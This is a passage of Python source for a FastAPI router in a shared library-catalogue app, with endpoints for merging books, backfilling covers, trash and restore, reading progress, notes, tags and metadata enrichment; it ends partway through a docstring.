@router.post("/merge", response_model=BookOut)
def merge_books(
    payload: MergeRequest,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    """Fold several catalogue entries into one.

    The survivor absorbs anything the others have and it lacks: a cover, an
    ISBN, a page count. It never overwrites a value it already holds, on the
    same principle as enrichment, since the kept row is the one a person chose.

    Tags, notes, loans and reading statuses are repointed rather than dropped.
    A status collision (both rows read by the same person) keeps the one on the
    survivor, because deleting somebody's reading history to satisfy a unique
    index is not an acceptable way to resolve it.
    """
    if payload.keep_id not in payload.book_ids:
        raise HTTPException(status_code=422, detail="keep_id must be one of book_ids")

    books = (
        db.query(Book)
        .filter(Book.id.in_(payload.book_ids), visible_to(current_user.id))
        .all()
    )
    found = {book.id: book for book in books}
    if payload.keep_id not in found:
        raise HTTPException(status_code=404, detail="Book not found")
    if len(found) < 2:
        raise HTTPException(status_code=422, detail="Nothing to merge into that book")

    keeper = found[payload.keep_id]
    losers = [book for book in books if book.id != keeper.id]

    # No further permission check: `visible_to` already yields exactly the set
    # this caller may write. Public books are a shared shelf, and a private
    # book is only visible to the member who added it, so anything that came
    # back from that filter is theirs to merge. See dependencies.book_for_write.

    # The ISBN is unique, so the row it is being taken from has to let go of it
    # first, in its own flush. Doing this after the absorb puts both UPDATEs in
    # one executemany, where the set lands before the clear and trips the index.
    # These rows are about to cease to exist, so releasing it costs nothing.
    absorbed_isbn = next((loser.isbn for loser in losers if loser.isbn), None)
    if keeper.isbn is None and absorbed_isbn is not None:
        for loser in losers:
            loser.isbn = None
        db.flush()

    _absorb_fields(keeper, losers, isbn_override=absorbed_isbn)
    db.flush()

    _repoint_relations(db, keeper, losers)
    db.flush()

    for loser in losers:
        # The keeper may have absorbed the loser's `cover_url`, which names a
        # file about to be deleted with it. Moving the file is what keeps that
        # cover working; everything else the loser held is dead bytes.
        if keeper.cover_url == covers.local_url_for(loser.id):
            adopted = covers.adopt(keeper.id, loser.id)
            keeper.cover_url = adopted if adopted else None
        covers.forget(loser.id)

        # Expire before deleting. The repointing above moved rows out from
        # under the loser, but its loaded relationship collections still list
        # them, and the delete cascade walks those collections rather than the
        # database. Without this, every note, loan and status just moved to the
        # keeper is deleted along with the row they came from.
        db.expire(loser)
        db.delete(loser)
    db.commit()
    db.refresh(keeper)
    return book_to_out(keeper, current_user, db)


_MERGEABLE_FIELDS = (
    # `isbn` is absent deliberately: it is unique and handled separately, ahead
    # of everything here. See _absorb_fields.
    "subtitle", "author", "publisher", "year", "description", "cover_url",
    "page_count", "language", "categories", "google_books_id",
    "series_name", "series_index", "location",
    "format", "condition", "lending", "purchase_price_minor", "purchase_currency",
    "purchased_at", "purchase_source",
)


def _absorb_fields(keeper: Book, losers: list[Book], *, isbn_override: str | None = None) -> None:
    """Fill the survivor's gaps from the rows about to disappear.

    `isbn_override` is passed because the losers have already been stripped of
    their ISBN by the time this runs, so the value cannot be read back off
    them. See the ordering note at the call site.
    """
    if keeper.isbn is None and isbn_override is not None:
        keeper.isbn = isbn_override

    for field in _MERGEABLE_FIELDS:
        if getattr(keeper, field) is not None:
            continue
        for loser in losers:
            value = getattr(loser, field)
            if value is not None:
                setattr(keeper, field, value)
                break


def _repoint_relations(db: Session, keeper: Book, losers: list[Book]) -> None:
    loser_ids = [book.id for book in losers]

    # Tags: a set union, since book_tags has no payload beyond the pair.
    existing_tags = {tag.id for tag in keeper.tags}
    for loser in losers:
        for tag in loser.tags:
            if tag.id not in existing_tags:
                keeper.tags.append(tag)
                existing_tags.add(tag.id)
        loser.tags.clear()

    # Notes and loans carry their own history and simply move across. Assigned
    # object by object rather than with a bulk UPDATE: a bulk update with
    # synchronize_session=False leaves the session's loaded collections stale,
    # and the delete that follows would cascade straight through them.
    for note in db.query(Note).filter(Note.book_id.in_(loser_ids)).all():
        note.book_id = keeper.id

    moved = db.query(Loan).filter(Loan.book_id.in_(loser_ids)).all()
    for loan in moved:
        loan.book_id = keeper.id

    # Merging two books that are both lent out used to give the survivor **two
    # open loans**, which the data model says cannot happen: `returned_at IS
    # NULL` is the single active loan. Every later `POST /api/loans` on that
    # book then 409s forever, and the UI renders one `active_loan` so there is
    # no way to see or close the other.
    #
    # The earliest one stays open, because it is the loan that has been out
    # longest and is the one worth chasing. The rest are closed now: the books
    # they described have just become one book, so they are not still out.
    # Built from the objects in hand rather than by re-querying: the
    # repointing above is not flushed yet, so a fresh query does not
    # necessarily see the moved loans as belonging to the survivor.
    on_keeper = db.query(Loan).filter(Loan.book_id == keeper.id).all()
    open_loans = sorted(
        {loan.id: loan for loan in [*on_keeper, *moved]}.values(),
        key=lambda loan: (loan.loaned_at, loan.id),
    )
    still_open = [loan for loan in open_loans if loan.returned_at is None]
    for loan in still_open[1:]:
        loan.returned_at = datetime.now(UTC).replace(tzinfo=None)

    # Progress moves wholesale. It carries no uniqueness of its own, so
    # unlike the statuses below there is nothing to resolve: two members'
    # readings of what turned out to be one book are two histories of one book.
    # Left out, the losers' rows would be cascade-deleted with them, silently
    # throwing away reading history the merge was never asked to touch.
    for entry in db.query(ReadingProgress).filter(
        ReadingProgress.book_id.in_(loser_ids)
    ):
        entry.book_id = keeper.id

    # Statuses cannot simply move: (user_id, book_id) is unique, so a member
    # holding a status on two of the merged rows would violate it. The
    # survivor's own row wins and the duplicate is dropped.
    already_rated = {
        row.user_id
        for row in db.query(UserBook).filter(UserBook.book_id == keeper.id).all()
    }
    for user_book in db.query(UserBook).filter(UserBook.book_id.in_(loser_ids)).all():
        if user_book.user_id in already_rated:
            db.delete(user_book)
        else:
            user_book.book_id = keeper.id
            already_rated.add(user_book.user_id)


# ── Covers ────────────────────────────────────────────────────────────────────

#: Books one backfill run repairs. The run is bounded rather than open ended
#: because it holds an HTTP request open while it fetches: at six at a time and
#: a six second timeout, a hundred books is the most that reliably finishes
#: inside a proxy's read timeout. The response says how many are left, and the
#: caller presses again.
MAX_BACKFILL_BOOKS: Final = 100


@router.post("/covers/backfill", response_model=CoverBackfillOut)
def backfill_covers(
    db: DbSession,
    current_user: CurrentUser,
    after_id: Annotated[
        int,
        Query(
            ge=0,
            # Bounded above as well as below, and the upper bound is not
            # decoration. A Python int has no ceiling and SQLite's does, so
            # without this a bigint passes validation, reaches the driver and
            # raises `OverflowError` from inside the query: a 500 out of the
            # unhandled-exception handler, which classes a bad request as a bug
            # in our own code. Every other numeric query parameter here is
            # bounded at both ends for the same reason.
            le=2**63 - 1,
            description="Carry on past this book id. From the previous reply.",
        ),
    ] = 0,
) -> CoverBackfillOut:
    """Fetch and store the covers of books that are missing one.

    This is what repairs a library that already exists. Storing covers on the
    way in only helps books added afterwards, and the books that need it most
    are the thousands that arrived through a CSV import, which never resolved a
    cover at all.

    **Scoped to the books the caller can see**, like every other query here. An
    admin-only backfill would be worse, not better: `visible_to` has no admin
    bypass, so an admin running it could never repair another member's private
    books, and those books would have no way to be repaired at all. Each member
    repairs their own shelf instead, and the privacy rule is not bent to make an
    operator action work.

    Targets every book with **no cover file behind its id**, which is the set
    that needs one: a book that never had a cover, a book whose `cover_url`
    points at a third party (that is what rots, a file on this volume is not),
    and a book whose column claims a local cover the directory does not have.
    The last case is why this reads the directory rather than the column: they
    can drift, files being the one thing a database row does not carry with it.

    **`after_id` is a cursor, and it is what lets this finish.** Without it the
    batch is the first hundred candidates by id, and a book that cannot be fixed
    stays a candidate, so it sits at the front of every subsequent run for ever.
    Measured across ten ISBNs, only eight resolved to an image, so roughly a
    fifth of any batch is permanently unfixable and accumulates; a pod with no
    egress produces the same shape on the first run. With the cursor each run
    starts past what the last one tried, and `next_after_id` comes back as 0
    once the end is reached, so pressing again starts over and re-tries the ones
    that failed, which may since have become fixable.

    Idempotent either way: a book with a file behind it is never a candidate, so
    a second pass over the same range examines nothing it fixed.
    """
    cover_backfill_limiter.check(current_user.username)

    # One directory read for the whole library, rather than a `stat` per book.
    # A book "has a cover here" when there is a file behind its id, not when its
    # `cover_url` says so: trusting the column is what would let the database
    # and the directory drift apart quietly, and it is also what would stop this
    # being safe to run twice.
    on_disk = covers.stored_ids()
    catalogue = (
        db.query(Book)
        .filter(visible_to(current_user.id), Book.id > after_id)
        .order_by(Book.id)
        .all()
    )
    candidates = [book for book in catalogue if book.id not in on_disk]
    batch = candidates[:MAX_BACKFILL_BOOKS]

    # Concurrent, because serial would be one round trip per book: a thousand
    # books at even half a second each is eight minutes of waiting. Bounded,
    # because the other end is two free public services and this deployment has
    # one address at them.
    #
    # Only the fetch runs in the pool. The Session is not thread safe, so the
    # assignment happens back here, in one thread. `pool.map` yields results in
    # the order it was given the inputs, which is what makes the positional zip
    # below correct.
    with ThreadPoolExecutor(max_workers=covers.MAX_CONCURRENT_FETCHES) as pool:
        resolved = list(
            pool.map(
                lambda book: covers.resolve_and_store(book.id, book.isbn, book.cover_url),
                batch,
            )
        )

    stored = 0
    unreachable = 0
    still_missing = 0
    for book, url in zip(batch, resolved, strict=True):
        if url is None:
            still_missing += 1
            continue
        if url != book.cover_url:
            book.cover_url = url
        if covers.is_local(url):
            stored += 1
        else:
            # Resolved to a remote URL this server could not download. Counted
            # separately from "no image service has one": with no egress every
            # book lands here, and folding it into either of the other two would
            # report a clean no-op in exactly the situation this exists for.
            unreachable += 1
    db.commit()

    remaining = len(candidates) - len(batch)
    logger.info(
        "Cover backfill for %s: examined %d, stored %d, unreachable %d, "
        "none found for %d, %d left. Totals: %s",
        current_user.username,
        len(batch),
        stored,
        unreachable,
        still_missing,
        remaining,
        covers.outcome_counts(),
    )
    return CoverBackfillOut(
        examined=len(batch),
        stored=stored,
        unreachable=unreachable,
        still_missing=still_missing,
        remaining=remaining,
        # 0 at the end, so the next press starts over rather than answering
        # nothing for ever.
        next_after_id=batch[-1].id if remaining > 0 else 0,
    )


# ── Trash ─────────────────────────────────────────────────────────────────────
#
# Deleting parks a row rather than dropping it. Three things follow from that,
# and each is somewhere a naive soft delete goes wrong.


def _trash(book: Book, db: Session) -> None:
    """Stamp the deletion, and close any loan that was open on it.

    The loan has to go with it. A trashed book leaves the loans list, which is
    deliberate, but the loan row stayed open and `PUT /api/loans/{id}/return`
    404s on a book nobody can see, so the borrower still had it and there was
    no way left to record it coming back. Closing it is the honest end: the
    book has left the catalogue, so the app is no longer tracking who has it.

    **Does not commit.** The caller does, once. Committing here made a bulk
    delete of 500 books 1001 statements and 2.08 seconds, because each commit
    expires the session and forces the next book to be re-selected, and it made
    the operation non-atomic: a crash halfway left half the selection deleted.
    """
    if book.deleted_at is not None:
        return

    now = datetime.now(UTC).replace(tzinfo=None)
    book.deleted_at = now
    for loan in db.query(Loan).filter(
        Loan.book_id == book.id, Loan.returned_at.is_(None)
    ):
        loan.returned_at = now


def _purge(book: Book, db: Session) -> None:
    """Delete a trashed book for good, and its cover file with it.

    The cover is the part a soft delete leaves behind, and it is the standing
    cost of holding covers on disk rather than in the row. Files are named by
    book id, so the next book to take that id inherits somebody else's cover,
    and since ids are reused by SQLite after the highest row goes, that is not a
    remote possibility. `_trash` deliberately does **not** do this: a trashed
    book can be restored, and restoring one to a placeholder would be a delete
    that half happened.

    **Does not commit**, for the same reason as `_trash`: emptying a trash of
    500 books was 3801 statements and 3.6 seconds of re-selecting.
    """
    covers.forget(book.id)
    db.delete(book)


@router.get("/trash", response_model=Page[BookOut])
def list_trash(
    db: DbSession,
    current_user: CurrentUser,
    paging: Paging,
) -> Page[BookOut]:
    """What this member has deleted and could still put back.

    Declared before `/{book_id}`, like `/export`: FastAPI matches in
    declaration order, so the reverse would make this a request for the book
    with id "trash".

    Most recently deleted first. The trash is read to find something just lost,
    not to browse a history.
    """
    query = db.query(Book).filter(in_trash_for(current_user.id))
    total = query.with_entities(func.count(Book.id)).order_by(None).scalar() or 0

    books = (
        query.options(joinedload(Book.added_by), selectinload(Book.tags))
        .order_by(Book.deleted_at.desc(), Book.id.desc())
        .offset(paging.offset)
        .limit(paging.limit)
        .all()
    )
    return Page[BookOut](
        items=books_to_out(books, current_user, db),
        total=total,
        page=paging.page,
        page_size=paging.page_size,
    )


@router.delete("/trash", response_model=PurgeResult)
def empty_trash(db: DbSession, current_user: CurrentUser) -> PurgeResult:
    """Delete everything in the caller's trash for good.

    Scoped by `in_trash_for`, so emptying the trash never reaches a book the
    caller could not see in it. There is no automatic expiry: this app has no
    scheduler, and a sweep at startup would delete on restart timing rather
    than on any schedule anybody chose.
    """
    books = db.query(Book).filter(in_trash_for(current_user.id)).all()
    for book in books:
        _purge(book, db)
    db.commit()
    return PurgeResult(purged=len(books))


# ── Single book ───────────────────────────────────────────────────────────────


@router.get("/{book_id}", response_model=BookOut)
def get_book(book: BookForRead, db: DbSession, current_user: CurrentUser) -> BookOut:
    return book_to_out(book, current_user, db)


@router.patch("/{book_id}/privacy", response_model=BookOut)
def set_privacy(
    payload: PrivacyUpdate,
    book: BookForOwner,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    book.is_private = payload.is_private
    db.commit()
    db.refresh(book)
    return book_to_out(book, current_user, db)


@router.delete("/{book_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_book(book: BookForWrite, db: DbSession) -> None:
    """Move a book to the trash. Reversible with `POST /{id}/restore`.

    The row stays and `deleted_at` is stamped. A delete is one tap away from
    every book, it is the only action here that repeating does not undo, and a
    catalogue is somebody's hours of typing. Reviews of the competition make
    the same complaint about all of them: the app does not say what was
    deleted and offers no way to put it back.

    The status code is unchanged at 204, so nothing calling this has to know.
    """
    _trash(book, db)
    db.commit()


@router.post("/{book_id}/restore", response_model=BookOut)
def restore_book(book: BookInTrash, db: DbSession, current_user: CurrentUser) -> BookOut:
    """Put a trashed book back on the shelf.

    Everything comes back with it: tags, notes, loans and every member's
    reading status, because none of it ever left. That is the difference
    between this and re-adding the book by hand, and it is the whole point.
    """
    book.deleted_at = None
    db.commit()
    db.refresh(book)
    return book_to_out(book, current_user, db)


@router.delete("/{book_id}/permanent", status_code=status.HTTP_204_NO_CONTENT)
def purge_book(book: BookInTrash, db: DbSession) -> None:
    """Delete one trashed book for good."""
    _purge(book, db)
    db.commit()


@router.put("/{book_id}/status", response_model=BookOut)
def update_status(
    payload: BookStatusUpdate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    """Set the caller's own reading status. Read access is enough: a status is
    personal to the member setting it and changes nothing for anyone else."""
    user_book = (
        db.query(UserBook)
        .filter(UserBook.user_id == current_user.id, UserBook.book_id == book.id)
        .first()
    )
    if user_book is None:
        user_book = UserBook(user_id=current_user.id, book_id=book.id)
        db.add(user_book)

    _stamp_reading_dates(user_book, payload.status)
    user_book.status = payload.status
    db.commit()
    return book_to_out(book, current_user, db)


def _stamp_reading_dates(user_book: UserBook, new_status: ReadStatus) -> None:
    """Record when reading started and finished, from the status transition.

    Derived rather than typed in, because nobody fills in a date field but
    everybody moves a book to "reading" when they start it. Three rules, and
    each exists for a case that came up while writing them:

    * Only stamp what is not already stamped. Re-selecting the current status,
      which a UI with pressable buttons makes easy, must not move a date that
      already records something true.
    * Going straight to READ stamps both. Plenty of books are only marked once,
      after the fact, and a finish with no start reads like missing data.
    * Moving *back* to an earlier status clears the later date. Marking a book
      unread again and leaving a finish date behind would leave it counted in
      "books finished this year" forever.

    DID_NOT_FINISH needed no fourth rule, and that is worth stating rather than
    leaving to be rediscovered. It is a claim that reading **started**, so it
    stamps `started_at` alongside READING and READ, and it is not a finish, so
    the `else` below already clears `finished_at` for it. What it must never do
    is fall into the last branch: clearing `started_at` would erase the fact
    that the book was ever picked up, which is the one thing this status is for.

    It also touches no `reading_progress` row. How far somebody got before
    giving up is exactly the interesting part, and nothing here deletes it.
    """
    now = datetime.now(UTC).replace(tzinfo=None)

    started = new_status in (
        ReadStatus.READING,
        ReadStatus.READ,
        ReadStatus.DID_NOT_FINISH,
    )
    if started and user_book.started_at is None:
        user_book.started_at = now

    if new_status is ReadStatus.READ:
        if user_book.finished_at is None:
            user_book.finished_at = now
    else:
        # Anything other than READ means it is not finished, whatever it was.
        # DID_NOT_FINISH included, and deliberately: a book somebody gave up on
        # must not be counted in "books finished this year".
        user_book.finished_at = None

    if new_status in (ReadStatus.UNREAD, ReadStatus.WANT_TO_READ):
        user_book.started_at = None


# ── Reading progress ──────────────────────────────────────────────────────────
#
# Declared here, beside the status endpoint they cooperate with, rather than up
# with `/export` and `/search`. The route-order gotcha does not reach these:
# it is about a **literal** first segment losing to `/{book_id}`, and
# `/{book_id}/progress` shares no shape with `/{book_id}` to lose to. See
# `docs/decisions.md`.
#
# All three take `BookForRead`. Progress is personal and changes nothing for
# anybody else, exactly like status and rating, so read access is the right
# gate. Every query filters on `user_id` **as well**: the book being visible
# says nothing about whose reading of it the caller may see.


@router.get("/{book_id}/progress", response_model=list[ProgressOut])
def list_progress(
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> list[ReadingProgress]:
    """The caller's own recorded positions, newest first.

    Never anybody else's, even on a public book. Two members reading the same
    copy is the ordinary case here, and the log is a diary rather than a shelf
    fact.
    """
    return (
        db.query(ReadingProgress)
        .filter(
            ReadingProgress.book_id == book.id,
            ReadingProgress.user_id == current_user.id,
        )
        .order_by(ReadingProgress.recorded_at.desc(), ReadingProgress.id.desc())
        .all()
    )


@router.post(
    "/{book_id}/progress",
    response_model=ProgressOut,
    status_code=status.HTTP_201_CREATED,
)
def add_progress(
    payload: ProgressCreate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> ReadingProgress:
    """Record where the caller has got to.

    Saying where you are in a book is the same claim the READING button makes,
    arrived at from the other direction, so it promotes an unstarted book
    rather than leaving a member with a page number and a status of "unread".
    The transition itself goes through `_stamp_reading_dates`, which owns those
    rules; duplicating them here is how the two would drift.

    **It never sets READ, whatever the page number.** `page_count` comes from a
    metadata provider and is off by one often enough that the last page is not
    a reliable finish signal, and finishing already has an explicit control.
    """
    entry = ReadingProgress(
        user_id=current_user.id,
        book_id=book.id,
        page=payload.page,
        percent=payload.percent,
        minutes=payload.minutes,
    )
    db.add(entry)

    user_book = (
        db.query(UserBook)
        .filter(UserBook.user_id == current_user.id, UserBook.book_id == book.id)
        .first()
    )
    if user_book is None:
        user_book = UserBook(user_id=current_user.id, book_id=book.id)
        db.add(user_book)

    # Only from a standing start. A book already READING needs no change, and
    # one already READ is being re-read, which is a thing the log records and
    # the status has no way to say.
    #
    # **DID_NOT_FINISH promotes**, unlike READ. It is a claim about the past,
    # and a new position contradicts it: leaving it alone would have the shelf
    # say "gave up on this" while the log says "reached page 240 this morning".
    # Picking an abandoned book back up is the case the status exists for. The
    # earlier progress rows are untouched, and `finished_at` is already null for
    # such a book and stays null, because READING is not READ.
    #
    # `or UNREAD` because a row added in this request has not been flushed, so
    # the column default has not been applied and `status` is still None. That
    # is the whole first-progress-on-a-new-book case, so without it the
    # promotion never fired at all.
    current = user_book.status or ReadStatus.UNREAD
    if current in (
        ReadStatus.UNREAD,
        ReadStatus.WANT_TO_READ,
        ReadStatus.DID_NOT_FINISH,
    ):
        _stamp_reading_dates(user_book, ReadStatus.READING)
        user_book.status = ReadStatus.READING

    db.commit()
    db.refresh(entry)
    return entry


@router.delete("/{book_id}/progress/{progress_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_progress(
    progress_id: int,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> None:
    """Remove one of the caller's own entries. A mistyped page is the case.

    404 for somebody else's row and for one belonging to a different book, not
    403, for the same reason an invisible book is: a 403 would confirm the id
    exists. The book/entry pairing is enforced so an id from another book
    cannot be deleted through a book the caller happens to have access to,
    which is the rule `_note_for_edit` states for notes.

    The status is left alone. Deleting the only entry does not put the book
    back to unread: somebody pressed READING, or this endpoint did on their
    behalf, and removing a mistyped page number is not a claim about that.
    """
    entry = (
        db.query(ReadingProgress)
        .filter(
            ReadingProgress.id == progress_id,
            ReadingProgress.book_id == book.id,
            ReadingProgress.user_id == current_user.id,
        )
        .first()
    )
    if entry is None:
        raise HTTPException(status_code=404, detail="Progress entry not found")
    db.delete(entry)
    db.commit()


# ── Tagging ───────────────────────────────────────────────────────────────────


@router.post("/{book_id}/tags/{tag_id}", response_model=BookOut)
def add_book_tag(
    tag_id: int,
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    tag = db.get(Tag, tag_id)
    if tag is None:
        raise HTTPException(status_code=404, detail="Tag not found")
    if tag not in book.tags:
        book.tags.append(tag)
        db.commit()
        db.refresh(book)
    return book_to_out(book, current_user, db)


@router.delete("/{book_id}/tags/{tag_id}", response_model=BookOut)
def remove_book_tag(
    tag_id: int,
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    tag = db.get(Tag, tag_id)
    if tag is not None and tag in book.tags:
        book.tags.remove(tag)
        db.commit()
        db.refresh(book)
    return book_to_out(book, current_user, db)


# ── Cover upload ──────────────────────────────────────────────────────────────


@router.post("/{book_id}/cover", response_model=BookOut)
async def upload_cover(
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
    file: Annotated[UploadFile, File()],
) -> BookOut:
    # The extension comes from the file's magic bytes, never from its name.
    data, extension = await read_image_upload(file)

    # Written into place, then the other formats of the same book removed. The
    # old order deleted first, so a failed write left the book with no cover at
    # all. See uploads.replace_image.
    replace_image(COVERS_DIR, str(book.id), extension, data)
    book.cover_url = covers.local_url(book.id, extension)
    db.commit()
    db.refresh(book)
    return book_to_out(book, current_user, db)


# ── Metadata refresh ──────────────────────────────────────────────────────────


@router.put("/{book_id}/refresh", response_model=BookOut)
async def refresh_metadata(book: BookForWrite, db: DbSession, current_user: CurrentUser) -> BookOut:
    if not book.isbn:
        raise HTTPException(status_code=400, detail="Book has no ISBN, cannot refresh metadata")

    metadata_limiter.check(current_user.username)
    lookup_key = isbn_utils.parse(book.isbn) or book.isbn
    result = await metadata.lookup(lookup_key, settings_store.google_books_api_key(db))
    if not result.found:
        raise HTTPException(**_lookup_failure(result))

    assert result.data is not None
    data = result.data

    book.title = data["title"] or book.title
    book.subtitle = data.get("subtitle")
    book.author = data.get("author")
    book.publisher = data.get("publisher")
    book.year = data.get("year")
    book.description = data.get("description")

    # Only ever filled in, never cleared: a refresh whose source lacks the page
    # count should not delete the one already on the record.
    book.language = data.get("language") or book.language
    book.page_count = data.get("page_count") or book.page_count

    # A cover the member uploaded outranks whatever the source offers.
    if not covers.is_local(book.cover_url):
        book.cover_url = data.get("cover_url")
        # `to_thread` rather than a direct call: this handler is a coroutine, and
        # `resolve_and_store` runs its own event loop.
        await asyncio.to_thread(_store_cover, book)

    db.commit()
    db.refresh(book)
    return book_to_out(book, current_user, db)


# ── Notes ─────────────────────────────────────────────────────────────────────


@router.get("/{book_id}/notes", response_model=list[NoteOut])
def get_notes(book: BookForRead, db: DbSession) -> list[Note]:
    """Requires read access to the book. Without that check, the notes on a
    private book were readable by anyone who guessed its id."""
    return (
        db.query(Note)
        .options(joinedload(Note.author))
        .filter(Note.book_id == book.id)
        .order_by(Note.created_at, Note.id)
        .all()
    )


@router.post("/{book_id}/notes", response_model=NoteOut, status_code=status.HTTP_201_CREATED)
def add_note(
    payload: NoteCreate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> Note | None:
    note = Note(book_id=book.id, user_id=current_user.id, content=payload.content)
    db.add(note)
    db.commit()
    db.refresh(note)
    return db.query(Note).options(joinedload(Note.author)).filter(Note.id == note.id).first()


def _note_for_edit(note_id: int, book: Book, current_user: User, db: Session) -> Note:
    """A note belonging to this book, which the caller may change.

    The book/note pairing is enforced so a note id from another book cannot be
    edited through a book the caller happens to have access to.
    """
    note = db.query(Note).filter(Note.id == note_id, Note.book_id == book.id).first()
    if note is None:
        raise HTTPException(status_code=404, detail="Note not found")
    if note.user_id != current_user.id and not current_user.is_admin:
        raise HTTPException(status_code=403, detail="Not allowed to change this note")
    return note


@router.put("/{book_id}/notes/{note_id}", response_model=NoteOut)
def edit_note(
    note_id: int,
    payload: NoteCreate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> Note | None:
    note = _note_for_edit(note_id, book, current_user, db)
    note.content = payload.content
    db.commit()
    return db.query(Note).options(joinedload(Note.author)).filter(Note.id == note.id).first()


@router.delete("/{book_id}/notes/{note_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_note(
    note_id: int,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> None:
    db.delete(_note_for_edit(note_id, book, current_user, db))
    db.commit()


# ── Enrichment ────────────────────────────────────────────────────────────────



@router.post("/{book_id}/enrich", response_model=BookEnrichmentOut)
async def enrich_book(
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
    overwrite: Annotated[bool, Query(description="Replace fields that already have a value")] = False,
) -> BookEnrichmentOut:
    """Fill in the fields a book is missing, from every catalogue available.

    Matched by ISBN when there is one, which runs the full merged chain (the
    DNB and K10plus together, then Open Library, then Google), and by title and
    author otherwise, which runs the ranked search across all six sources.

    **No API key is required.** This was Google-only and refused outright
    without a key, which made it useless for exactly the books the German and
    French catalogues were added for: a 978-3 ISBN that Google does not carry
    would report "no key" rather than the full record the DNB was holding.

    Only empty fields are filled unless `overwrite` is set: enrichment adds
    what is missing, it does not overrule what somebody typed.
    """
    metadata_limiter.check(current_user.username)
    # Present is better than absent, but never required. When a key is
    # configured Google joins the chain as its last source; when it is not,
    # everything else still answers.
    api_key = (
        settings_store.google_books_api_key(db)
        if settings_store.get_bool(db, SettingKey.GOOGLE_BOOKS_ENABLED)
        else ""
    )

    fields: dict[str, Any] | None = None
    if book.isbn:
        result = await metadata.lookup(book.isbn, api_key)
        if result.found:
            fields = _enrichment_fields(result.data or {})

    if fields is None:
        # No ISBN, or no catalogue carries this edition under it.
        query = " ".join(part for part in (book.title, book.author) if part)
        matches = await metadata.search(query, api_key, limit=1)
        if matches:
            fields = dict(matches[0])

    if fields is None:
        return BookEnrichmentOut(
            book=book_to_out(book, current_user, db), updated_fields=[], found=False
        )

    updated = google_books.merge_into(book, fields, overwrite=overwrite)
    if updated:
        # `to_thread` because this handler is a coroutine. See refresh_metadata.
        await asyncio.to_thread(_store_cover, book)
        db.commit()
        db.refresh(book)

    return BookEnrichmentOut(
        book=book_to_out(book, current_user, db), updated_fields=updated, found=True
    )


def _enrichment_fields(record: dict[str, Any]) -> dict[str, Any]:
    """A lookup record in the shape `google_books.merge_into` writes from.

    Two differences and no more: the merger reads `categories` as the joined
    string a book row stores, where a lookup carries a list of subject
    headings, and it has no use for the ISBN it was already given.
    """
    fields = dict(record)
    subjects = fields.pop("subjects", None)
    if subjects:
        fields["categories"] = google_books.join_categories(subjects)
    return fields


@router.post("/{book_id}/enrich/apply", response_model=BookEnrichmentOut)
def apply_enrichment(
    payload: BookMatch,
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
    overwrite: Annotated[bool, Query(description="Replace fields that already have a value")] = False,
) -> BookEnrichmentOut:
    """Fill this book in from an edition the member picked.

    Separate from `POST /enrich`, which chooses for them. This exists because
    choosing automatically is wrong often enough to matter: a paperback and its
    hardback are different page counts and different covers, and a search will
    happily return the wrong printing of the right book. Nothing is written
    until somebody has looked at the candidates and said which one it is.

    The merge rule is the same either way, and it is the server's rather than
    the client's: only empty fields are filled unless `overwrite` is set, so a
    publisher somebody typed in by hand is never quietly replaced.
    """
    updated = google_books.merge_into(
        book,
        payload.model_dump(exclude={"source", "suggested_tag_ids"}),
        overwrite=overwrite,
    )
    if updated:
        _store_cover(book)
        db.commit()
        db.refresh(book)

    return BookEnrichmentOut(
        book=book_to_out(book, current_user, db), updated_fields=updated, found=True
    )


@router.get("/{book_id}/enrich/candidates", response_model=list[BookMatch])
async def enrichment_candidates(
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> list[BookMatch]:
    """Other editions of this book, so the right one can be chosen.

    Useful when the automatic match picks a different printing: the page count
    and cover of a paperback and its hardback are not the same. Searched across
    every catalogue, and ranked, so a German edition of a German book is not
    buried under whatever Google happened to return first.
    """
    metadata_limiter.check(current_user.username)
    api_key = (
        settings_store.google_books_api_key(db)
        if settings_store.get_bool(db, SettingKey.GOOGLE_BOOKS_ENABLED)
        else ""
    )
    query = " ".join(part for part in (book.title, book.author) if part)

    matches = await metadata.search(
        query, api_key, limit=5, prefer_language=book.language
    )
    return [BookMatch(**match) for match in matches]


@router.patch("/{book_id}/ownership", response_model=BookOut)
def set_ownership(
    payload: OwnershipUpdate,
    book: BookForWrite,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    book.ownership = payload.ownership
    db.commit()
    db.refresh(book)
    return book_to_out(book, current_user, db)


@router.patch("/{book_id}/rating", response_model=BookOut)
def set_rating(
    payload: BookRatingUpdate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    """Rate a book, or clear the rating with a null.

    Read access, like status, and for the same reason: a rating is one person's
    opinion and changes nothing for anyone else. It deliberately does not touch
    the reading dates, because rating a book is not a claim about having
    finished it just now.
    """
    user_book = (
        db.query(UserBook)
        .filter(UserBook.user_id == current_user.id, UserBook.book_id == book.id)
        .first()
    )
    if user_book is None:
        user_book = UserBook(user_id=current_user.id, book_id=book.id)
        db.add(user_book)

    user_book.rating = payload.rating
    db.commit()
    return book_to_out(book, current_user, db)


@router.patch("/{book_id}/discuss", response_model=BookOut)
def set_discuss(
    payload: BookDiscussUpdate,
    book: BookForRead,
    db: DbSession,
    current_user: CurrentUser,
) -> BookOut:
    """Offer to talk about this book, or withdraw the offer.

    Read access, like status and rating: it is the caller's own flag on a book
    they can see, and it changes nothing about the book itself.

    Unlike those two it is **read by everybody**, which is the point. It says
    nothing about whether the caller has read the book; `my_status` stays
    private.

